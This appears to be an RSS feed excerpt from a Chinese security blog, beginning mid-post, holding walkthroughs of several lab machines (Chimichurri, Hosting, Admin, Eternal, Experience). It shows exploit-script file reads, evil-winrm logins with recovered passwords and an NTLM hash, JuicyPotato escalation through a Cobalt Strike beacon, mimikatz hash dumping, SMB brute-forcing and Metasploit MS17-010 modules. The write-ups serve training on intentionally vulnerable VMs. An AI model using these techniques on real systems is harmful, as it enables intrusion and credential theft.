其中“como perico”是个比喻，可能意味着“很显眼”或“随意放置”，暗示这些密钥没有被妥善保护。
<br>┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
└─# python3 51993.py -u http://192.168.200.4:6969
Press Ctrl+C to exit
File to download:
&gt; /users/hacker/desktop/perico.txt
hacker:Perico69

<br>成功获取 hacker 用户的密码<br>尝试看能不能登录<br>┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
└─# evil-winrm -i 192.168.200.4 -u hacker -p Perico69

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\hacker\Documents&gt;

<br>成功登录<br><br>先看一下当前用户的权限<br>INFORMACIàN DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci¢n                                  Estado
============================= ============================================ ==========
SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio     Habilitada
SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido             Habilitada
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci¢n Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada

<br>SeImpersonatePrivilege 权限允许我们利用别人的用户权限进行命令执行<br>
可以传一个 <a data-tooltip-position="top" aria-label="../../26-工具使用/RunasCS使用" data-href="../../26-工具使用/RunasCS使用" href="https://www.c1trus.top/26-工具使用/runascs使用.html" class="internal-link" target="_self" rel="noopener nofollow">RunasCS</a> 进行利用。也可以用传土豆进行提权<br>
但 RunasCS 需要另一个用户的账号密码 所以这里排除使用这个<br>这里我都不选。我用cs提权<br>
传一个cs后门运行，上线<br>
<img alt="Pasted image 20241203135830" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203135830.png" referrerpolicy="no-referrer"><br>选择Juicypotato提权<br>
<img alt="Pasted image 20241203140042" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203140042.png" referrerpolicy="no-referrer"><br>
成功提取到系统<br>这里还有个问题。获取到了系统权限还不让我看flag，只给管理员权限的用户看看<br><br>这里需要降权。系统权限降权到管理员很简单、<br>
在cs里面 可以使用进程注入 或者令牌窃取<br>这里我采用直接mimikatz抓管理员hash用管理员登录<br>
<img alt="Pasted image 20241203142754" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203142754.png" referrerpolicy="no-referrer"><br>┌──(root㉿kali)-[/home/kali/thl/Chimichurri]
└─# evil-winrm -i 192.168.200.4 -u Administrador -H 058a4c99bab8b3d04a6bd959f95ce2b2

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrador\Documents&gt; whoami
chimichurri0\administrador

*Evil-WinRM* PS C:\Users\Administrador\Documents&gt; type c:\users\administrador\desktop\root.txt
hjafcdv8a75e3cvsdfg6asd4f9vbsf9sa
*Evil-WinRM* PS C:\Users\Administrador\Documents&gt; type c:\users\hacker\desktop\user.txt
acrsgvs6edr8f5vaw9a8eadv6fa9b

<br>
注意这比西班牙语的管理员名字与英语的管理员有区别
]]></description><link>https://www.c1trus.top/24-渗透/thl/1.chimichurri.html</link><guid isPermaLink="false">24-渗透/THL/1.Chimichurri.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203133056.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203133056.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[4.Hosting]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a><br>
- <a data-tooltip-position="top" aria-label="2.1. 端口扫描" data-href="#2.1. 端口扫描" href="https://www.c1trus.top/about:blank#2.1._端口扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 端口扫描</a><br>
- <a data-tooltip-position="top" aria-label="2.2. 目录扫描" data-href="#2.2. 目录扫描" href="https://www.c1trus.top/about:blank#2.2._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">2.2. 目录扫描</a><br>
靶机链接<br>
难度 ⭐️⭐️️
<br><br><br>┌──(root㉿kali)-[~/Desktop/vulnyx/Hosting]
└─# nmap 192.168.56.21 -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-23 03:54 EST
Nmap scan report for 192.168.56.21
Host is up (0.00069s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE    VERSION
80/tcp  open  tcpwrapped
|_http-title: IIS Windows
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp open  tcpwrapped
139/tcp open  tcpwrapped
445/tcp open  tcpwrapped

Host script results:
| smb2-time:
|   date: 2024-12-23T14:54:55
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: 5h59m58s
|_nbstat: NetBIOS name: HOSTING, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:46:6d:91 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.36 seconds

<br><br>┌──(root㉿kali)-[~/Desktop/vulnyx/Hosting]
└─# gobuster dir -u http://192.168.56.21/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.21/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,zip,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/speed                (Status: 301) [Size: 161] [--&gt; http://192.168.56.21/speed/]

<br><img alt="assets/Pasted image 20241223165928.png" src="https://www.c1trus.top/24-渗透/vulnyx/assets/pasted-image-20241223165928.png"><br>
继续对这个目录扫描<br>┌──(root㉿kali)-[~/Desktop/vulnyx/Hosting]
└─# dirsearch -u http://192.168.56.21/speed
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/vulnyx/Hosting/reports/http_192.168.56.21/_speed_24-12-23_04-02-31.txt

Target: http://192.168.56.21/

[04:02:31] Starting: speed/
[04:02:31] 301 -  164B  - /speed/js  -&gt;  http://192.168.56.21/speed/js/
[04:02:31] 403 -  312B  - /speed/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[04:02:33] 403 -  312B  - /speed/\..\..\..\..\..\..\..\..\..\etc\passwd
[04:02:37] 403 -  312B  - /speed/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[04:02:38] 301 -  165B  - /speed/css  -&gt;  http://192.168.56.21/speed/css/
[04:02:40] 301 -  167B  - /speed/fonts  -&gt;  http://192.168.56.21/speed/fonts/
[04:02:41] 301 -  168B  - /speed/images  -&gt;  http://192.168.56.21/speed/images/
[04:02:41] 403 -    1KB - /speed/images/
[04:02:41] 403 -    1KB - /speed/js/

Task Completed

<br>访问后查看源码没有感觉没有什么可以直接利用的点或者隐藏的提示信息<br>
<img alt="assets/Pasted image 20241223170417.png" src="https://www.c1trus.top/24-渗透/vulnyx/assets/pasted-image-20241223170417.png"><br>
在这里可以获取到4个人名<br>
我们将它写入字典<br>我靶机现在有问题。使用正确的账号密码无法登录]]></description><link>https://www.c1trus.top/24-渗透/vulnyx/4.hosting.html</link><guid isPermaLink="false">24-渗透/Vulnyx/4.Hosting.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/vulnyx/assets/pasted-image-20241223165928.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-渗透/vulnyx/assets/pasted-image-20241223165928.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[3.Admin]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. 目录扫描" data-href="#2.1. 目录扫描" href="https://www.c1trus.top/about:blank#2.1._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 目录扫描</a>
<br><a data-tooltip-position="top" aria-label="2.2. smb空会话检测" data-href="#2.2. smb空会话检测" href="https://www.c1trus.top/about:blank#2.2._smb空会话检测" class="internal-link" target="_self" rel="noopener nofollow">2.2. smb空会话检测</a>


<br><a data-tooltip-position="top" aria-label="3. smb爆破" data-href="#3. smb爆破" href="https://www.c1trus.top/about:blank#3._smb爆破" class="internal-link" target="_self" rel="noopener nofollow">3. smb爆破</a>
<br><a data-tooltip-position="top" aria-label="4. 提权" data-href="#4. 提权" href="https://www.c1trus.top/about:blank#4._提权" class="internal-link" target="_self" rel="noopener nofollow">4. 提权</a><br>
靶机链接<br>
难度 ⭐️⭐️️
<br><br>
┌──(root㉿kali)-[~/Desktop/vulnyx/Admin]
└─# nmap -sCV 192.168.56.20
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-22 23:28 EST
Nmap scan report for 192.168.56.20
Host is up (0.00076s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
MAC Address: 08:00:27:5E:A6:CF (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: ADMIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:5e:a6:cf (Oracle VirtualBox virtual NIC)
|_clock-skew: 6h59m58s
| smb2-time:
|   date: 2024-12-23T11:28:57
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.13 seconds


<br><br>┌──(root㉿kali)-[~/Desktop/vulnyx/Admin]
└─# gobuster dir -u http://192.168.56.20/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.20/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/tasks.txt            (Status: 200) [Size: 98]
/Tasks.txt            (Status: 200) [Size: 98]


┌──(root㉿kali)-[~/Desktop/vulnyx/Admin]
└─# curl http://192.168.56.20/tasks.txt
Pending tasks:

 - Finish website
 - Update OS
 - Drink coffee
 - Rest
 - Change password

By hope 
<br>获取到了一个用户名 hope<br><br>
┌──(root㉿kali)-[~/Desktop/vulnyx/Admin]
└─# smbmap -H 192.168.56.20 -u guest -p ' '

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                                                         [*] Detected 1 hosts serving SMB
[|] Initializing hosts...                                                                              [/] Authenticating...                                                                                  [-] Authenticating...                                                                                  [\] Authenticating...                                                                                  [*] Established 1 SMB connections(s) and 0 authenticated session(s)
[|] Closing connections..                                                                              [/] Closing connections..                                                                              [-] Closing connections..                                                                              [*] Closed 1 connections

<br>看来不存在<br><br>既然获取到了用户名<br>
那么可以尝试进行爆破<br>┌──(root㉿kali)-[~/Desktop/vulnyx/Admin]
└─# crackmapexec smb 192.168.56.20 -u 'hope' -p 'loser'
SMB         192.168.56.20   445    ADMIN            [*] Windows 10 / Server 2019 Build 19041 x64 (name:ADMIN) (domain:ADMIN) (signing:False) (SMBv1:False)
SMB         192.168.56.20   445    ADMIN            [-] ADMIN\hope:loser STATUS_ACCOUNT_LOCKED_OUT

<br>Warning
这里正常是可以爆破出Hope用户的密码 loser<br>
但是我靶机可能出问题了 用这个密码登录不上去。 试了下爆破其他的密码 但是爆破不了
<br><br>这里由于我Hope用户无法登录，所以无法完成。直接看的wp<br>
<a rel="noopener nofollow" class="external-link" href="https://d4t4s3c.medium.com/vulnyx-admin-walkthrough-66fc5891bec0" target="_blank">https://d4t4s3c.medium.com/vulnyx-admin-walkthrough-66fc5891bec0</a><br>
winrm上去后<br>
利用 winpeas检测 可以获取到管理员的执行Powershell的历史记录<br>
里面有他的账号密码<br><img alt="assets/Pasted image 20241223125754.png" src="https://www.c1trus.top/24-渗透/vulnyx/assets/pasted-image-20241223125754.png"><br>然后利用winrm连接去上即可<br>┌──(root㉿kali)-[~/Desktop/vulnyx/Admin]
└─# evil-winrm -i 192.168.56.20 -u administrator -p SuperAdministrator123

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\administrator\Documents&gt; whoami
admin\administrator
*Evil-WinRM* PS C:\Users\administrator\Documents&gt;

]]></description><link>https://www.c1trus.top/24-渗透/vulnyx/3.admin.html</link><guid isPermaLink="false">24-渗透/Vulnyx/3.Admin.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://www.c1trus.top/24-渗透/vulnyx/assets/pasted-image-20241223125754.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-渗透/vulnyx/assets/pasted-image-20241223125754.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[2.Eternal]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. ms17-010" data-href="#3. ms17-010" href="https://www.c1trus.top/about:blank#3._ms17-010" class="internal-link" target="_self" rel="noopener nofollow">3. ms17-010</a><br>
难度 ⭐️️
<br><br>┌──(root㉿kali)-[~/Desktop/Eternal]
└─# fscan -h 192.168.56.19

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 2.0.0
[*] 扫描类型: all, 目标端口: 21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017,80,81,82,83,84,85,86,87,88,89,90,91,92,98,99,443,800,801,808,880,888,889,1000,1010,1080,1081,1082,1099,1118,1888,2008,2020,2100,2375,2379,3000,3008,3128,3505,5555,6080,6648,6868,7000,7001,7002,7003,7004,7005,7007,7008,7070,7071,7074,7078,7080,7088,7200,7680,7687,7688,7777,7890,8000,8001,8002,8003,8004,8006,8008,8009,8010,8011,8012,8016,8018,8020,8028,8030,8038,8042,8044,8046,8048,8053,8060,8069,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8100,8101,8108,8118,8161,8172,8180,8181,8200,8222,8244,8258,8280,8288,8300,8360,8443,8448,8484,8800,8834,8838,8848,8858,8868,8879,8880,8881,8888,8899,8983,8989,9000,9001,9002,9008,9010,9043,9060,9080,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9200,9443,9448,9800,9981,9986,9988,9998,9999,10000,10001,10002,10004,10008,10010,10250,12018,12443,14000,16080,18000,18001,18002,18004,18008,18080,18082,18088,18090,18098,19001,20000,20720,21000,21501,21502,28018,20880
[*] 开始信息扫描...
[*] 最终有效主机数量: 1
[*] 共解析 218 个有效端口
[+] 端口开放 192.168.56.19:139
[+] 端口开放 192.168.56.19:445
[+] 端口开放 192.168.56.19:135
[+] 存活端口数量: 3
[*] 开始漏洞扫描...
[!] 扫描错误 192.168.56.19:139 - netbios error
[*] NetInfo
[*] 192.168.56.19
   [-&gt;] MIKE-PC
   [-&gt;] 192.168.56.19
[+] MS17-010 192.168.56.19      (Windows 7 Enterprise 7601 Service Pack 1)
[+] 扫描已完成: 3/3
[*] 扫描结束,耗时: 1.0239191s

<br><br>msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set rhost 192.168.56.19
set lhost 192.168.56.6
run

c:\Users\MIKE\Desktop&gt;type root.txt
type root.txt
1682c7160e3855a6685316efb97ce451

c:\Users\MIKE\Desktop&gt;type user.txt
type user.txt
c4fa8bfbc9855acfced6a56a7da3156e
]]></description><link>https://www.c1trus.top/24-渗透/vulnyx/2.eternal.html</link><guid isPermaLink="false">24-渗透/Vulnyx/2.Eternal.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate></item><item><title><![CDATA[1.Experience]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. ms17-010" data-href="#3. ms17-010" href="https://www.c1trus.top/about:blank#3._ms17-010" class="internal-link" target="_self" rel="noopener nofollow">3. ms17-010</a><br>
靶机链接<br>
难度 ⭐️️
<br><br>┌──(root㉿kali)-[~/Desktop/vulnyx/Experience]
└─# fscan -h 192.168.56.17

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 2.0.0
[*] 扫描类型: all, 目标端口: 21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017,80,81,82,83,84,85,86,87,88,89,90,91,92,98,99,443,800,801,808,880,888,889,1000,1010,1080,1081,1082,1099,1118,1888,2008,2020,2100,2375,2379,3000,3008,3128,3505,5555,6080,6648,6868,7000,7001,7002,7003,7004,7005,7007,7008,7070,7071,7074,7078,7080,7088,7200,7680,7687,7688,7777,7890,8000,8001,8002,8003,8004,8006,8008,8009,8010,8011,8012,8016,8018,8020,8028,8030,8038,8042,8044,8046,8048,8053,8060,8069,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8100,8101,8108,8118,8161,8172,8180,8181,8200,8222,8244,8258,8280,8288,8300,8360,8443,8448,8484,8800,8834,8838,8848,8858,8868,8879,8880,8881,8888,8899,8983,8989,9000,9001,9002,9008,9010,9043,9060,9080,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9200,9443,9448,9800,9981,9986,9988,9998,9999,10000,10001,10002,10004,10008,10010,10250,12018,12443,14000,16080,18000,18001,18002,18004,18008,18080,18082,18088,18090,18098,19001,20000,20720,21000,21501,21502,28018,20880
[*] 开始信息扫描...
[*] 最终有效主机数量: 1
[*] 共解析 218 个有效端口
[+] 端口开放 192.168.56.17:139
[+] 端口开放 192.168.56.17:445
[+] 端口开放 192.168.56.17:135
[+] 存活端口数量: 3
[*] 开始漏洞扫描...
[!] 扫描错误 192.168.56.17:139 - netbios error
[*] NetInfo
[*] 192.168.56.17
   [-&gt;] experience
   [-&gt;] 192.168.56.17
[+] MS17-010 192.168.56.17      (Windows 5.1)
[+] 扫描已完成: 3/3
[*] 扫描结束,耗时: 45.275206ms

<br><br>msfconsole
use exploit/windows/smb/ms17_010_psexec
set lhost 192.168.56.6
set rhost 192.168.56.17
run 


C:\Documents and Settings\bill\Desktop&gt;type root.txt
type root.txt
c1d5e7e4efece4a6022c4a4080c8114d

C:\Documents and Settings\bill\Desktop&gt;type user.txt
type user.txt
f9e24c8da0686680decee9e594178a2e

]]></description><link>https://www.c1trus.top/24-渗透/vulnyx/1.experience.html</link><guid isPermaLink="false">24-渗透/Vulnyx/1.Experience.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate></item><item><title><![CDATA[Home]]></title><description><![CDATA[ 
 <br>continue...<br><br><br><br><br><br><br>....continue]]></description><link>https://www.c1trus.top/40-obsidian/home.html</link><guid isPermaLink="false">40-Obsidian/Home.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Mon, 30 Dec 2024 14:39:58 GMT</pubDate></item></channel></rss>